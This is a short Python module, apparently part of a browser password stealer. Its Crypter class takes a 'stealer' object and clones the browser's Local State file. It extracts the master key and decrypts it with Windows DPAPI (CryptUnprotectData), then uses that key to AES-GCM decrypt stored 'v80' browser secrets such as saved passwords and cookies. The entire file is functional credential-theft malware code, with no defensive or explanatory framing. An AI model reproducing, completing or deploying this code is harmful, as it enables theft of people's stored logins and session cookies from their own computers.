import json, base64
from browsers import Browsers

from Cryptodome.Cipher import AES
import win32crypt

class Crypter:
    def __init__(self, stealer, browser : Browsers):
        self.stealer = stealer
        self.browser = browser
        self.cloned_state = self.stealer._clone_db(self.browser.value.get('state'))
        self.master_key = self.get_key()

    def get_key(self):
        with open(self.cloned_state, 'r', encoding='utf-8') as f:
            j = json.load(f)
        k = base64.b64decode(j.get('os_crypt').get('encrypted_key'))
        k = k[5:]
        k = self.win_decrypt(k)
        return k

    def win_decrypt(self, buffer):
        try:
            return win32crypt.CryptUnprotectData(buffer, None, None, None, 0)[1]
        except:
            pass
            return None

    def v80_decrypt(self, buffer):
        try:
            iv = buffer[3:15]
            buffer = buffer[15:]
            cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(buffer)
            dec = dec[:-16].decode()
            return dec
        except:
            pass
            return None